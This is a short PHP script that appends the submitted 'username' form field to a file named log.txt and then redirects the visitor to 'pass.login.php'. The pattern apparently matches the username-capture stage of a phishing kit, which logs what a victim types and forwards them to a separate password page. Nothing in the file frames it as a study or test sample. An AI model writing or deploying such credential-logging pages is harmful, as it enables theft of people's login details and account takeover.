<?php

    file_put_contents("log.txt", "User: " . $_POST['username'] . "\n", FILE_APPEND);
header('Location: pass.login.php');
exit();